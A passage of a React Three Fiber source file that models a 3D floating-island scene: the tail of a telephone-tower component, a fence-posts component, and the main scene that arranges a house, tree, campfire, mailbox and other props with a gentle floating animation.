        <meshStandardMaterial color="#7a7a8a" roughness={0.4} metalness={0.6} />
      </mesh>

      {/* ══ RED WARNING LIGHTS — breathing glow ══ */}
      <BreathingLight y1={2.2} y2={2.32} />

      {/* ══ ANTENNA PANELS ══ */}
      <group position={[-0.14, 1.35, 0.05]}>
        <mesh castShadow>
          <boxGeometry args={[0.13, 0.52, 0.06]} />
          <meshStandardMaterial color="#d8dde8" roughness={0.3} metalness={0.2} />
        </mesh>
        {[-0.15, 0, 0.15].map((y, i) => (
          <mesh key={i} position={[0, y, 0.033]}>
            <boxGeometry args={[0.11, 0.01, 0.002]} />
            <meshStandardMaterial color="#aab0bc" roughness={0.4} />
          </mesh>
        ))}
        <mesh position={[0.1, 0, 0]}>
          <boxGeometry args={[0.055, 0.07, 0.04]} />
          <meshStandardMaterial color="#555566" roughness={0.5} metalness={0.5} />
        </mesh>
      </group>

      <group position={[0.14, 1.25, -0.05]}>
        <mesh castShadow>
          <boxGeometry args={[0.13, 0.58, 0.06]} />
          <meshStandardMaterial color="#d0d5e0" roughness={0.3} metalness={0.2} />
        </mesh>
        {[-0.18, -0.06, 0.06, 0.18].map((y, i) => (
          <mesh key={i} position={[0, y, 0.033]}>
            <boxGeometry args={[0.11, 0.01, 0.002]} />
            <meshStandardMaterial color="#a8aeba" roughness={0.4} />
          </mesh>
        ))}
        <mesh position={[-0.1, 0, 0]}>
          <boxGeometry args={[0.055, 0.07, 0.04]} />
          <meshStandardMaterial color="#555566" roughness={0.5} metalness={0.5} />
        </mesh>
      </group>

      {/* ══ EQUIPMENT BOXES ══ */}
      <group position={[-0.16, 0.42, 0]}>
        <mesh castShadow>
          <boxGeometry args={[0.15, 0.20, 0.09]} />
          <meshStandardMaterial color="#b8bcc8" roughness={0.4} metalness={0.3} />
        </mesh>
        {[-0.06, 0, 0.06].map((y, i) => (
          <mesh key={i} position={[0, y, 0.047]}>
            <boxGeometry args={[0.12, 0.014, 0.002]} />
            <meshStandardMaterial color="#9a9eaa" roughness={0.5} />
          </mesh>
        ))}
      </group>
      <group position={[0.16, 0.32, 0]}>
        <mesh castShadow>
          <boxGeometry args={[0.13, 0.17, 0.08]} />
          <meshStandardMaterial color="#c0c4d0" roughness={0.4} metalness={0.3} />
        </mesh>
      </group>

      {/* ══ MICROWAVE DISH ══ */}
      <group position={[-0.26, 0.18, 0.0]} rotation={[0, -0.3, 0]}>
        <mesh castShadow rotation={[0, Math.PI/2, 0]}>
          <sphereGeometry args={[0.11, 10, 8, 0, Math.PI*2, 0, Math.PI/2]} />
          <meshStandardMaterial color="#c8ccd8" roughness={0.3} metalness={0.4} side={THREE.DoubleSide} />
        </mesh>
        <mesh rotation={[0, Math.PI/2, 0]}>
          <torusGeometry args={[0.11, 0.007, 6, 20]} />
          <meshStandardMaterial color="#888899" roughness={0.4} metalness={0.5} />
        </mesh>
        <mesh position={[0.07, 0, 0]} rotation={[0, 0, Math.PI/2]}>
          <cylinderGeometry args={[0.013, 0.018, 0.09, 8]} />
          <meshStandardMaterial color="#666677" roughness={0.4} metalness={0.5} />
        </mesh>
      </group>

      {/* ══ CABLE RUNS ══ */}
      {[-0.04, 0, 0.04].map((x, i) => (
        <mesh key={i} position={[x, 0.5, 0.04]}>
          <cylinderGeometry args={[0.004, 0.004, 2.6, 4]} />
          <meshStandardMaterial color="#222233" roughness={0.8} />
        </mesh>
      ))}

      {/* ══ BASE FEET ══ */}
      {[0, 1, 2, 3].map(i => {
        const a = (i / 4) * Math.PI * 2 + Math.PI / 4
        return (
          <mesh key={i} position={[Math.cos(a) * 0.4, -1.62, Math.sin(a) * 0.4]} castShadow>
            <boxGeometry args={[0.12, 0.06, 0.12]} />
            <meshStandardMaterial color="#444455" roughness={0.7} metalness={0.4} />
          </mesh>
        )
      })}

    </group>
  )
}




// ── Fence along island edge ────────────────────────────────────
function FencePosts() {
  // Arc along the FRONT-LEFT edge of island, visible from default camera
  // Island radius is 3.6 — place fence at radius ~3.1 so it sits on the island
  const RADIUS = 3.1
  const Y = 0.28

  // Arc from ~160° to ~280° (front-left to back-left edge)
  const NUM_POSTS = 4
  const START_ANGLE = (160 * Math.PI) / 180
  const END_ANGLE   = (200 * Math.PI) / 180

  const posts = Array.from({ length: NUM_POSTS }, (_, i) => {
    const t = i / (NUM_POSTS - 1)
    const angle = START_ANGLE + t * (END_ANGLE - START_ANGLE)
    return [
      Math.cos(angle) * RADIUS,
      Y,
      Math.sin(angle) * RADIUS,
      angle,
    ]
  })

  return (
    <group>
      {/* Posts */}
      {posts.map(([x, y, z, angle], i) => (
        <group key={i} position={[x, y, z]} rotation={[0, -angle + Math.PI / 2, 0]}>
          <mesh castShadow>
            <boxGeometry args={[0.06, 0.44, 0.06]} />
            <meshStandardMaterial color={C.wallDk} roughness={0.75} />
          </mesh>
          <mesh position={[0, 0.24, 0]}>
            <coneGeometry args={[0.05, 0.09, 4]} />
            <meshStandardMaterial color={C.wall} roughness={0.65} />
          </mesh>
        </group>
      ))}

      {/* Rails */}
      {posts.slice(0, -1).map(([x, y, z], j) => {
        const [nx, , nz] = posts[j + 1]
        const mx = (x + nx) / 2
        const mz = (z + nz) / 2
        const len = Math.sqrt((nx - x) ** 2 + (nz - z) ** 2)
        const angle = Math.atan2(nz - z, nx - x)
        return [0.06, 0.18].map((dy, ri) => (
          <mesh key={`${j}-${ri}`} position={[mx, y + dy, mz]} rotation={[0, -angle, 0]}>
            <boxGeometry args={[len, 0.025, 0.025]} />
            <meshStandardMaterial color={C.wall} roughness={0.7} />
          </mesh>
        ))
      })}
    </group>
  )
}

// ── Main Scene ─────────────────────────────────────────────────────────────
function FloatingIslandScene({ onSelect }) {
  const groupRef = useRef()
  useFrame(({ clock }) => {
    if (groupRef.current) {
      // Gentle float ONLY — no rotation
      groupRef.current.position.y = Math.sin(clock.elapsedTime * 0.55) * 0.06
    }
  })

  return (
    <group ref={groupRef}>
      <Island />
      <House />
      <Steps />
      <DeskSetup onSelect={onSelect} />
      {/* Chair REMOVED as requested */}
      <Tree position={[2.5, 0.28, -1.8]} />
      {/* <Tree position={[-1.5, 0.28, -1.9]} /> */}
      <Lantern position={[-1.7, 0.28, -0.5]} />
      <Campfire position={[1.75, 0.28, 1.75]} />
      <Mailbox onSelect={onSelect} />
      {/* <WelcomeSign onSelect={onSelect} /> */}
      <ProjectCanvas onSelect={onSelect} />
      {/* <SocialBadges onSelect={onSelect} /> */}
      {/* <SmallPlant position={[-2.4, 0.28, -1.8]} />
      <SmallPlant position={[ 2.6, 0.28, -0.6]} />
      <SmallPlant position={[-1.2, 0.28,  2.2]} /> */}
      <Rocks />
      <Plant />
      <FencePosts />
      <TelephoneTower />
    </group>
  )
}

export default FloatingIslandScene
